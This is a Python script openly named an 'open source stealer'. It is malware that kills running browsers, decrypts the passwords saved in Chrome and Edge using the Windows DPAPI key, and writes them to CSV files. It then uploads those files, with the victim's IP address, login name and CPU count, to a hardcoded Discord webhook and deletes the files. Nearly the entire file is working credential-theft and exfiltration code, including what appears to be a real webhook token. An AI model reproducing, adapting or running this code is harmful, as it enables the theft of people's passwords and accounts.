import os
import re
import requests
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv
from discord_webhook import DiscordWebhook

ip = requests.get("https://api.ipify.org") 
name = os.getlogin()
cores = os.cpu_count()
avatarurl = "https://cdn.discordapp.com/attachments/1344737886972416032/1346204443166642248/stealer_logo.png?ex=67c75616&is=67c60496&hm=8db5576f0fcfdefefa793fc5a74401c37374445711a0e360e113feb24e2c42f3&"
webhook = "https://discord.com/api/webhooks/1345694308564598865/PEck0J_cwmpsWFKKrg0ITV10G0gofNFekS2RlTU-sFp4yUEFh9IkuM1dMWH-U_SGAfhF"
webhook_username = "open source stealer"

browsers = ["chrome.exe","msedge.exe","firefox.exe","opera.exe","iexplore.exe","brave.exe","vivaldi.exe"]
for browser in browsers:
        kill = f"taskkill /F /IM {browser}"
        result = os.system(kill)
  


chrome_localstate = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
chromepath = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
edge_localstate = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
edgepath = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))

#chrome
def get_secret_key():
    try:
        with open( chrome_localstate, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None
        
if __name__ == '__main__':
    try:
        with open('chrome.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["opensourcestealer"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(chromepath) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(chromepath,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))

#edge
def get_secret_key_edge():
    try:
        with open( edge_localstate, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
    
def decrypt_payload_edge(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher_edge(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""
    
def get_db_connection_edge(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None
        
if __name__ == '__main__':
    try:
        with open('edge.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["opensourcestealer"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(edgepath) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(edgepath,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))




respond = DiscordWebhook(avatar_url=avatarurl, url=webhook, content=f'@everyone Victim at {ip.text} called {name} with {cores} cpu cores! Passwords here:', username=webhook_username)

with open("chrome.csv", "rb") as f:
    respond.add_file(file=f.read(), filename="chrom.csv")
with open("edge.csv", "rb") as f:
    respond.add_file(file=f.read(), filename="edg.csv")

respond.execute()

os.remove("chrome.csv")
os.remove("edge.csv")

